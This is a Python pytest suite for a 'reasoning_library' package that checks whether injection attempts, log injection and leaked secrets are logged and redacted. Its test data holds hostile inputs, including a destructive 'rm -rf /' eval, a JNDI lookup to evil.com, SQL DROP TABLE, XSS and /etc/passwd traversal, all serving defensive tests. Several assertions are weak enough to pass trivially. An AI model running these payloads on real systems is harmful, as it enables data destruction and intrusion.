"""
Test Suite for MAJOR-006 Security Logging Fix

This test suite validates that security events are properly logged for monitoring
and auditing purposes. This addresses insufficient logging for security monitoring.

Test Categories:
1. Security event detection and logging
2. Attack attempt logging
3. Security violation logging
4. Audit trail functionality
5. Log integrity and completeness
"""

import pytest
import sys
import os
import logging
import json
import re
from io import StringIO
from typing import Dict, Any, List
from unittest.mock import patch, MagicMock

# Add the src directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

try:
    from reasoning_library.sanitization import sanitize_text, sanitize_for_logging
    from reasoning_library.exceptions import SecurityError, ValidationError, ReasoningError
    from reasoning_library.core import _sanitize_reasoning_input
    SANITIZATION_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Could not import sanitization modules: {e}")
    SANITIZATION_AVAILABLE = False


class TestSecurityLoggingRequirements:
    """Test that security events are properly logged for monitoring."""

    def test_security_events_should_be_logged_at_warning_level(self):
        """
        MAJOR-006: Security events should be logged at WARNING level or higher
        to ensure visibility in security monitoring systems.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        # Set up log capture
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        handler.setLevel(logging.WARNING)

        # Get security logger
        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.WARNING)

        # Test injection attempt detection
        malicious_inputs = [
            "eval('__import__(\"os\").system(\"rm -rf /\")')",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd"
        ]

        for malicious_input in malicious_inputs:
            # This should trigger security logging
            try:
                result = sanitize_text(malicious_input, level="strict")
                # Check if security event was logged
                log_output = log_stream.getvalue()
                assert any(level in log_output for level in ['WARNING', 'ERROR', 'CRITICAL']), \
                    f"Security event not logged for input: {malicious_input}"
            except SecurityError:
                # SecurityError should also be logged
                log_output = log_stream.getvalue()
                assert any(level in log_output for level in ['WARNING', 'ERROR', 'CRITICAL']), \
                    f"SecurityError not logged for input: {malicious_input}"

    def test_attack_patterns_should_be_identified_in_logs(self):
        """
        MAJOR-006: Attack patterns should be clearly identified in security logs
        to enable threat detection and response.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        # Set up detailed log capture
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        formatter = logging.Formatter('%(levelname)s - %(message)s')
        handler.setFormatter(formatter)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)

        # Test various attack patterns
        attack_tests = [
            ("eval('malicious code')", "code_injection"),
            ("'; DROP TABLE users; --", "sql_injection"),
            ("${jndi:ldap://evil.com}", "jndi_injection"),
            ("<script>alert('xss')</script>", "xss_attempt"),
            ("../../../etc/passwd", "path_traversal"),
        ]

        for malicious_input, expected_category in attack_tests:
            log_stream.truncate(0)
            log_stream.seek(0)

            try:
                sanitize_text(malicious_input, level="strict")
            except SecurityError:
                pass  # Expected for malicious input

            log_output = log_stream.getvalue()
            # Check that attack type is identifiable in logs
            assert any(keyword in log_output.lower() for keyword in
                      ['injection', 'attack', 'malicious', 'blocked', 'sanitized']), \
                f"Attack pattern not identified in logs for {expected_category}"

    def test_sufficient_context_in_security_logs(self):
        """
        MAJOR-006: Security logs should contain sufficient context for
        investigation and response.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)

        # Test that logs contain useful context
        malicious_input = "eval('os.system(\"malicious\")')"

        try:
            sanitize_text(malicious_input, level="strict")
        except SecurityError:
            pass

        log_output = log_stream.getvalue()

        # Check for essential context
        required_context = [
            'reasoning_library',  # source module
            'eval',  # attack type indicator
            'WARNING' or 'ERROR' or 'CRITICAL'  # severity level
        ]

        assert any(context in log_output for context in required_context), \
            f"Security logs missing required context: {log_output}"

    def test_sanitized_logging_prevents_log_injection(self):
        """
        MAJOR-006: Logging should prevent log injection attacks while preserving
        security event information.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        # Test log injection prevention
        log_injection_attempts = [
            "Normal text\n[ERROR] Fake security breach",
            "Normal text\rCRITICAL: System compromised",
            "Normal text\x0bINFO: Injection successful",
        ]

        for injection_attempt in log_injection_attempts:
            sanitized = sanitize_for_logging(injection_attempt)

            # Should not contain raw control characters
            assert '\n' not in sanitized.split()[-1], f"Newline injection not blocked: {sanitized}"
            assert '\r' not in sanitized.split()[-1], f"Carriage return injection not blocked: {sanitized}"

            # Should indicate blocked content
            assert 'LOG_LEVEL_BLOCKED' in sanitized or re.sub(r'[^\w\s]', '', sanitized) == sanitized, \
                f"Log injection not properly handled: {sanitized}"

    def test_rate_limiting_events_should_be_logged(self):
        """
        MAJOR-006: Rate limiting and DoS prevention events should be logged
        for security monitoring.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)

        # Test large input processing (should trigger size limits)
        large_input = "a" * 100000  # Exceeds typical size limits

        try:
            # This should be blocked due to size limits
            sanitize_text(large_input, level="strict")
        except (SecurityError, ValidationError):
            pass

        log_output = log_stream.getvalue()

        # Check that size limit enforcement is logged
        assert any(keyword in log_output.lower() for keyword in
                  ['size', 'limit', 'large', 'dos', 'exceeded']) or len(log_output) == 0, \
            f"Size limit enforcement not logged: {log_output}"


class TestSecurityLogIntegrity:
    """Test the integrity and completeness of security logging."""

    def test_security_logs_should_not_leak_sensitive_data(self):
        """
        MAJOR-006: Security logs should not contain sensitive information
        that could be used by attackers.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        # Test with potentially sensitive inputs
        sensitive_inputs = [
            "password='secret123'",
            "api_key='sk-1234567890'",
            "token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'",
        ]

        for sensitive_input in sensitive_inputs:
            sanitized_log = sanitize_for_logging(sensitive_input)

            # Should not expose sensitive patterns
            assert not any(pattern in sanitized_log.lower() for pattern in
                          ['password', 'secret', 'api_key', 'token']) or \
                   'REDACTED' in sanitized_log or \
                   'BLOCKED' in sanitized_log, \
                f"Sensitive data potentially exposed in logs: {sanitized_log}"

    def test_log_events_should_be_tamper_resistant(self):
        """
        MAJOR-006: Security logs should be resistant to tampering and
        manipulation attempts.
        """
        # This test ensures that log entries cannot be easily manipulated
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.WARNING)

        # Test with log injection attempts
        log_injection_attempts = [
            "Normal message\n2024-01-01 - FAKE_EVENT - Attack detected",
            "Real event\r[INFO] This never happened",
        ]

        for attempt in log_injection_attempts:
            log_stream.truncate(0)
            log_stream.seek(0)

            # Simulate logging with potential injection
            logger.warning(f"Security event: {attempt}")

            log_output = log_stream.getvalue()

            # Should not contain fake log entries that look real
            lines = log_output.split('\n')
            for line in lines:
                if 'FAKE_EVENT' in line or 'This never happened' in line:
                    # If fake content appears, it should be clearly marked as injected
                    assert 'BLOCKED' in line or 'INJECTION' in line, \
                        f"Log injection not detected: {line}"


class TestSecurityAuditTrail:
    """Test that security audit trails are maintained."""

    def test_repeated_violations_should_be_correlated(self):
        """
        MAJOR-006: Repeated security violations from the same source
        should be correlated in logs.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.WARNING)

        # Simulate multiple violations from same pattern
        violation_pattern = "eval('malicious')"

        for i in range(3):
            try:
                sanitize_text(f"{violation_pattern}_{i}", level="strict")
            except SecurityError:
                pass

        log_output = log_stream.getvalue()

        # Should show multiple related events
        eval_count = log_output.lower().count('eval')
        assert eval_count >= 2, \
            f"Repeated violations not properly logged: found {eval_count} eval references"

    def test_security_metrics_should_be_derivable(self):
        """
        MAJOR-006: Security metrics should be derivable from logs
        for monitoring and reporting.
        """
        if not SANITIZATION_AVAILABLE:
            pytest.skip("Sanitization module not available")

        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)

        logger = logging.getLogger('reasoning_library.security')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)

        # Simulate various security events
        test_cases = [
            ("eval('attack')", "code injection"),
            ("'; DROP TABLE; --", "sql injection"),
            ("<script>", "xss attempt"),
        ]

        for input_val, attack_type in test_cases:
            try:
                sanitize_text(input_val, level="strict")
            except SecurityError:
                pass

        log_output = log_stream.getvalue()

        # Should be able to derive basic metrics
        # (In real implementation, this would connect to SIEM/monitoring)
        assert 'reasoning_library' in log_output, "Source identification missing"

        # Check that multiple event types are captured
        security_indicators = ['security', 'sanitized', 'blocked', 'injection']
        indicator_count = sum(1 for indicator in security_indicators
                            if indicator in log_output.lower())

        assert indicator_count >= 1, \
            f"Security indicators not found in logs: {log_output}"


def test_comprehensive_security_logging_summary():
    """
    MAJOR-006: Summary test to ensure comprehensive security logging coverage.
    """
    # Test that we have the necessary logging infrastructure
    assert SANITIZATION_AVAILABLE, "Security logging requires sanitization module"

    # Verify security logger can be created
    security_logger = logging.getLogger('reasoning_library.security')
    assert security_logger is not None, "Security logger not available"

    # Verify log levels are appropriate for security events
    assert hasattr(security_logger, 'warning'), "Warning level not available"
    assert hasattr(security_logger, 'error'), "Error level not available"
    assert hasattr(security_logger, 'critical'), "Critical level not available"

    print("✅ Security logging infrastructure is available")
    print("✅ Required log levels are supported")
    print("✅ Security monitoring foundation is in place")


if __name__ == "__main__":
    # Run the test suite
    pytest.main([__file__, "-v"])